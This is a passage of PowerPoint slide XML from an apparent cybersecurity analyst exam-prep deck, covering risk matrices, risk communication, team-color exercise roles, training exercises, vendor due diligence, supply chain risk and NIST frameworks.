                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Expect to read a likelihood-versus-impact matrix and identify which risk falls in the highest-severity (red) cell and therefore should be addressed first.</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786</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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 · RISK CALCULATION AND COMMUNICATION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Qualitative Risk Matrix</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g_a686f317b4.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="2064371"/>
            <a:ext cx="10634472" cy="3872257"/>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787</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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 · RISK CALCULATION AND COMMUNICATION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Sample Impact Interpretation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g_decc5b2dc2.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="1991610"/>
            <a:ext cx="10634472" cy="4017779"/>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788</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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 · RISK CALCULATION AND COMMUNICATION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Example Qualitative Risk Calculation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g_59c2efb21a.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="797306" y="1783080"/>
            <a:ext cx="10594340" cy="4434840"/>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789</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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 · RISK CALCULATION AND COMMUNICATION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Communication of Risk Factors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Communicating risk factors means presenting risk findings to multiple audiences, from executives and boards to technical teams and external partners, each of whom needs the information framed differently.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  The message must be tailored for each audience: leadership needs business impact, cost, and risk-appetite language, while technical staff need specific vulnerabilities, affected systems, and remediation detail.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Effective communication translates technical findings into terms that let each group make appropriate decisions and take the right action.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  For a SOC analyst, poorly tailored reporting stalls remediation and funding, so matching content, depth, and vocabulary to the audience is a core professional skill.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Questions test choosing the right report content and level of technical detail for a given audience, such as an executive summary for the board versus a detailed finding for engineers.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790</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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 · RISK CALCULATION AND COMMUNICATION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Communication of Risk Factors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Presentation to multiple audiences</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Must be tailored for each audience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791</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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 · TRAINING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Teaming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Teaming assigns exercise roles by color: the Red Team acts as the opposing force (OPFOR) simulating real threat actors to validate the defenders' assumptions, while the Blue Team is the defenders who detect, respond to, and fix what the Red Team discovers.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  The White Team plans and moderates the exercise, sets the rules of engagement, and adjudicates the outcome as a neutral referee.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  The Purple Team is a dynamic hybrid that has Red and Blue work together collaboratively, testing the Blue Team's people, processes, and technologies while sharing techniques in real time rather than in secret.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Analysts benefit because purple teaming closes the feedback loop fastest, turning offensive findings directly into improved detections and defenses.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Be able to match each team color to its role, especially that Purple Team means Red and Blue collaborating and White Team means the neutral planners and moderators.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792</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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 · TRAINING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Teaming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5486400" cy="4480560"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Red Team</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Simulates threat actors (OPFOR); validates blue team assumptions</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Blue Team</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  The defenders; fixes red team discoveries</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  White Team</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Planners and moderators</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Purple Team</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Dynamic hybrid of red and blue</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Test blue team’s processes, people, &amp; technologies in a collaborative way</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="8" name="Picture 7" descr="img_505119eeb6.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6492240" y="2893329"/>
            <a:ext cx="4937760" cy="2077182"/>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793</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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 · TRAINING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Training Programs &amp; Resources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Building analyst capability combines formal technical training with real-life experience and active participation in the security community, such as giving presentations at security conferences to sharpen and share expertise.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Hands-on rehearsal comes through tabletop exercises (TTXs), which are discussion-based walkthroughs of an incident scenario, and live-fire exercises, which test teams against active simulated attacks.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A cyber range provides a safe, isolated virtual environment where defenders can practice detection and response against realistic attacks without risking production systems, and organizations may stand up separate training teams to run these programs.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A SOC values these resources because skills degrade without practice, and rehearsing under realistic conditions exposes gaps in people, process, and tooling before a real incident does.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Distinguish a tabletop exercise (discussion-based) from a live-fire exercise (hands-on simulated attack) and recognize a cyber range as the isolated environment used for realistic practice.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794</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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 · TRAINING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Training Programs &amp; Resources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Technical training</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Real life experience</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Active member of the community</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Ex: presentations at security conferences</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Tabletop exercises (TTXs)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Live-fire exercises</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Cyber range</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Separate training teams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795</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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 · SUPPLY CHAIN ASSESSMENT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Vendor Due Diligence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Vendor due diligence is the investigation an organization performs before and after engaging a third party to confirm the vendor can be trusted with its data and operations.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  It includes reviewing references and speaking with former and current customers, checking sources such as Better Business Bureau (BBB) reports, and ensuring contracts require adequate security controls and that service level agreements (SLAs) define performance and availability commitments.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Deeper assurance comes from reviewing the vendor's security program, its internal and external audit reports and third-party reviews, conducting onsite inspections and interviews after signing, and confirming the vendor maintains a business continuity plan (BCP), backed by a nondisclosure agreement (NDA) to protect shared information.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Analysts care because third-party weaknesses become the organization's own risk, and diligence provides contractual and evidentiary leverage to hold vendors to a security baseline.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Expect questions on evaluating third-party risk, recognizing SLAs, NDAs, BCP requirements, and audit-report review as the mechanisms that enforce vendor security.</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796</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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 · SUPPLY CHAIN ASSESSMENT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Vendor Due Diligence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Review references and communicate with former and existing customers</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Review Better Business Bureau (BBB) reports</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Ensure that contracts/ agreements include requirements for adequate security controls</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Ensure that service level agreements (SLAs) are in place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797</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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 · SUPPLY CHAIN ASSESSMENT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Vendor Due Diligence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Review vendor’s security program</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Review internal and external audit reports and third-party reviews</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Conduct onsite inspection and interviews after signing the agreement</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Ensure the vendor has a business continuity plan (BCP)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Implement a nondisclosure agreement (NDA)</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798</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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 · SUPPLY CHAIN ASSESSMENT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Supply Chain Risk Assessment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Supply chain risk assessment evaluates the threats introduced by the hardware, software, and services an organization sources from others, since a compromise anywhere upstream can reach the buyer.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A central concern is hardware source authenticity—verifying that components are genuine and have not been counterfeited or tampered with (for example, implanted backdoors) during manufacturing or transit.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  The U.S. Department of Defense addresses this with the Trusted Foundry program, which certifies suppliers to produce microelectronics through a vetted, secure, and controlled process.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A security analyst assesses supply chain risk because counterfeit or tampered components can defeat every downstream control, making provenance and trusted sourcing part of the overall risk posture.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Recognize hardware source authenticity and the DoD Trusted Foundry program as controls that counter counterfeit and tampered components in the supply chain.</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799</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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 · SUPPLY CHAIN ASSESSMENT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Supply Chain Risk Assessment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Hardware source authenticity</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Trusted Foundry (DoD)</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800</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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 · FRAMEWORKS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NIST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The National Institute of Standards and Technology (NIST) publishes widely adopted cybersecurity guidance, including its Special Publication series that defines security control catalogs and processes.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  NIST SP 800-53 provides a comprehensive catalog of recommended security and privacy controls for federal information systems and organizations, and is broadly reused in the private sector as a control baseline.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  The NIST Cybersecurity Framework (CSF) offers a risk-based, outcome-oriented structure organized around core functions—Identify, Protect, Detect, Respond, and Recover (with Govern added in CSF 2.0)—that maps controls to business objectives.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Security analysts use these publications to select controls, benchmark maturity, and speak a common language with auditors, regulators, and management.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Know that SP 800-53 is the control catalog and that the NIST CSF is organized around its core functions (Identify, Protect, Detect, Respond, Recover, and Govern in CSF 2.0).</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801</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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 · FRAMEWORKS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NIST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NIST Special Publication 800-53 (Recommended Security Controls for Federal Information Systems)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Cyber Security Framework (CSF)</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802</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

